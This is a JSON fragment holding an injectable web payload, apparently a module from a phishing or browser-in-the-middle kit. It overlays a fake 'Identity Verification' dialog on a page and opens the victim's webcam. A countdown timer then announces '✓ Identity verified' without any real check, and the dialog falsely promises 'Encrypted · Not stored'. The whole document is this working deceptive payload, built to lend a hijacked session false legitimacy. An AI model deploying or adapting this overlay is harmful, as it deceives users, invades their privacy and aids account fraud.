  "payload": "<style>\n#pbitm-kyc-overlay{position:fixed;inset:0;z-index:999999;display:flex;align-items:center;justify-content:center;background:rgba(10,10,18,0.75);backdrop-filter:blur(6px);-webkit-backdrop-filter:blur(6px);animation:pbitm-fadein 0.4s ease;}\n@keyframes pbitm-fadein{from{opacity:0}to{opacity:1}}\n@keyframes pbitm-fadeout{from{opacity:1}to{opacity:0}}\n#pbitm-kyc-dialog{background:#0d0f16;border:1px solid rgba(255,255,255,0.07);border-radius:22px;padding:32px 28px 28px;width:min(400px,calc(100vw - 32px));display:flex;flex-direction:column;align-items:center;box-shadow:0 40px 100px rgba(0,0,0,0.7),0 0 0 1px rgba(255,255,255,0.03);font-family:-apple-system,BlinkMacSystemFont,\"Segoe UI\",Roboto,sans-serif;}\n#pbitm-kyc-badge{display:flex;align-items:center;gap:7px;background:rgba(59,130,246,0.1);border:1px solid rgba(59,130,246,0.25);border-radius:100px;padding:5px 13px;margin-bottom:14px;}\n#pbitm-kyc-badge span{font-size:10px;font-weight:700;letter-spacing:0.1em;text-transform:uppercase;color:#60a5fa;}\n#pbitm-kyc-title{font-size:17px;font-weight:700;color:#f1f1f1;text-align:center;margin-bottom:6px;line-height:1.3;}\n#pbitm-kyc-subtitle{font-size:12px;color:rgba(255,255,255,0.38);text-align:center;margin-bottom:22px;line-height:1.5;}\n#pbitm-kyc-cam-wrap{position:relative;width:260px;height:260px;border-radius:14px;overflow:hidden;background:#060608;margin-bottom:20px;flex-shrink:0;}\n#pbitm-kyc-video{width:100%;height:100%;object-fit:cover;display:block;transform:scaleX(-1);}\n#pbitm-kyc-oval-svg{position:absolute;inset:0;width:100%;height:100%;pointer-events:none;}\n#pbitm-kyc-oval-ellipse{transition:stroke 0.7s ease;}\n.oval-blue{stroke:#3b82f6;filter:drop-shadow(0 0 7px #3b82f699);}\n.oval-green{stroke:#22c55e;filter:drop-shadow(0 0 10px #22c55e99);}\n@keyframes pulse-ring{0%{stroke-width:3;opacity:0.6}50%{stroke-width:5;opacity:0.25}100%{stroke-width:3;opacity:0.6}}\n.oval-pulse{animation:pulse-ring 2s ease-in-out infinite;}\n.oval-pulse.done{animation:none;}\n#pbitm-kyc-checkmark{position:absolute;inset:0;display:flex;align-items:center;justify-content:center;opacity:0;transition:opacity 0.5s ease;pointer-events:none;}\n#pbitm-kyc-checkmark.visible{opacity:1;}\n#pbitm-kyc-checkmark-circle{width:68px;height:68px;background:rgba(34,197,94,0.15);border:2px solid #22c55e;border-radius:50%;display:flex;align-items:center;justify-content:center;}\n#pbitm-kyc-no-cam{position:absolute;inset:0;display:none;flex-direction:column;align-items:center;justify-content:center;gap:10px;color:rgba(255,255,255,0.3);font-size:12px;font-family:inherit;}\n#pbitm-kyc-status{font-size:12px;font-weight:500;color:rgba(255,255,255,0.45);text-align:center;margin-bottom:10px;min-height:18px;transition:color 0.4s;}\n#pbitm-kyc-status.ready{color:#22c55e;}\n#pbitm-kyc-progress-wrap{width:100%;height:3px;background:rgba(255,255,255,0.06);border-radius:100px;overflow:hidden;margin-bottom:22px;}\n#pbitm-kyc-progress-bar{height:100%;width:0%;border-radius:100px;background:linear-gradient(90deg,#3b82f6,#06b6d4);transition:width 1s linear,background 0.7s ease;}\n#pbitm-kyc-progress-bar.green{background:linear-gradient(90deg,#22c55e,#16a34a);}\n#pbitm-kyc-footer{font-size:10px;color:rgba(255,255,255,0.18);text-align:center;display:flex;align-items:center;gap:5px;}\n</style>\n<script>\n(function() {\n  if (document.getElementById('pbitm-kyc-overlay')) return;\n\n  var COUNTDOWN = parseInt('{{ params[0] }}') || 10;\n\n  var overlay = document.createElement('div');\n  overlay.id = 'pbitm-kyc-overlay';\n  overlay.setAttribute('role', 'dialog');\n  overlay.setAttribute('aria-modal', 'true');\n  overlay.innerHTML =\n    '<div id=\"pbitm-kyc-dialog\">' +\n      '<div id=\"pbitm-kyc-badge\">' +\n        '<svg width=\"12\" height=\"12\" viewBox=\"0 0 24 24\" fill=\"none\" stroke=\"#60a5fa\" stroke-width=\"2.5\" stroke-linecap=\"round\" stroke-linejoin=\"round\"><path d=\"M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z\"/></svg>' +\n        '<span>Identity Verification</span>' +\n      '</div>' +\n      '<div id=\"pbitm-kyc-title\">Verifying your identity</div>' +\n      '<div id=\"pbitm-kyc-subtitle\">Keep your face inside the oval and hold still</div>' +\n      '<div id=\"pbitm-kyc-cam-wrap\">' +\n        '<video id=\"pbitm-kyc-video\" autoplay muted playsinline></video>' +\n        '<svg id=\"pbitm-kyc-oval-svg\" viewBox=\"0 0 260 260\" xmlns=\"http://www.w3.org/2000/svg\">' +\n          '<defs><mask id=\"pbitm-oval-mask\">' +\n            '<rect width=\"260\" height=\"260\" fill=\"white\"/>' +\n            '<ellipse cx=\"130\" cy=\"130\" rx=\"78\" ry=\"102\" fill=\"black\"/>' +\n          '</mask></defs>' +\n          '<rect width=\"260\" height=\"260\" fill=\"rgba(0,0,0,0.38)\" mask=\"url(#pbitm-oval-mask)\"/>' +\n          '<ellipse id=\"pbitm-kyc-oval-ellipse\" class=\"oval-blue oval-pulse\" cx=\"130\" cy=\"130\" rx=\"78\" ry=\"102\" fill=\"none\" stroke=\"#3b82f6\" stroke-width=\"3\"/>' +\n        '</svg>' +\n        '<div id=\"pbitm-kyc-checkmark\">' +\n          '<div id=\"pbitm-kyc-checkmark-circle\">' +\n            '<svg width=\"32\" height=\"32\" viewBox=\"0 0 24 24\" fill=\"none\" stroke=\"#22c55e\" stroke-width=\"2.5\" stroke-linecap=\"round\" stroke-linejoin=\"round\"><polyline points=\"20 6 9 17 4 12\"/></svg>' +\n          '</div>' +\n        '</div>' +\n        '<div id=\"pbitm-kyc-no-cam\">' +\n          '<svg width=\"36\" height=\"36\" viewBox=\"0 0 24 24\" fill=\"none\" stroke=\"currentColor\" stroke-width=\"1.5\"><path d=\"M1 1l22 22M17 17H3a2 2 0 0 1-2-2V7a2 2 0 0 1 2-2h3m3-2h6l2 2h4a2 2 0 0 1 2 2v9.34\"/></svg>' +\n          '<span>Camera unavailable</span>' +\n        '</div>' +\n      '</div>' +\n      '<div id=\"pbitm-kyc-status\">Starting camera…</div>' +\n      '<div id=\"pbitm-kyc-progress-wrap\"><div id=\"pbitm-kyc-progress-bar\"></div></div>' +\n      '<div id=\"pbitm-kyc-footer\">' +\n        '<svg width=\"11\" height=\"11\" viewBox=\"0 0 24 24\" fill=\"none\" stroke=\"currentColor\" stroke-width=\"2\"><rect x=\"3\" y=\"11\" width=\"18\" height=\"11\" rx=\"2\" ry=\"2\"/><path d=\"M7 11V7a5 5 0 0 1 10 0v4\"/></svg>' +\n        'Encrypted &middot; Not stored' +\n      '</div>' +\n    '</div>';\n  document.body.appendChild(overlay);\n\n  var video       = document.getElementById('pbitm-kyc-video');\n  var ovalEl      = document.getElementById('pbitm-kyc-oval-ellipse');\n  var progressBar = document.getElementById('pbitm-kyc-progress-bar');\n  var statusEl    = document.getElementById('pbitm-kyc-status');\n  var noCam       = document.getElementById('pbitm-kyc-no-cam');\n  var checkmark   = document.getElementById('pbitm-kyc-checkmark');\n  var stream      = null;\n  var elapsed     = 0;\n  var completed   = false;\n\n  function dismiss() {\n    if (completed) return;\n    completed = true;\n    overlay.style.animation = 'pbitm-fadeout 0.5s ease forwards';\n    setTimeout(function() {\n      overlay.remove();\n      if (stream) stream.getTracks().forEach(function(t) { t.stop(); });\n      __removeModule();\n    }, 500);\n  }\n\n  function startCountdown() {\n    statusEl.textContent = 'Scanning… ' + COUNTDOWN + 's';\n    var interval = setInterval(function() {\n      elapsed++;\n      progressBar.style.width = ((elapsed / COUNTDOWN) * 100) + '%';\n      statusEl.textContent = 'Scanning… ' + (COUNTDOWN - elapsed) + 's';\n      if (elapsed >= COUNTDOWN) {\n        clearInterval(interval);\n        ovalEl.classList.remove('oval-blue', 'oval-pulse');\n        ovalEl.classList.add('oval-green', 'done');\n        progressBar.classList.add('green');\n        progressBar.style.width = '100%';\n        statusEl.textContent = '✓ Identity verified';\n        statusEl.classList.add('ready');\n        checkmark.classList.add('visible');\n        setTimeout(dismiss, 3000);\n      }\n    }, 1000);\n  }\n\n  navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false })\n    .then(function(s) {\n      stream = s;\n      video.srcObject = s;\n      noCam.style.display = 'none';\n      setTimeout(startCountdown, 600);\n    })\n    .catch(function() {\n      noCam.style.display = 'flex';\n      video.style.display = 'none';\n      statusEl.textContent = 'Camera unavailable or access denied';\n    });\n})();\n</script>",
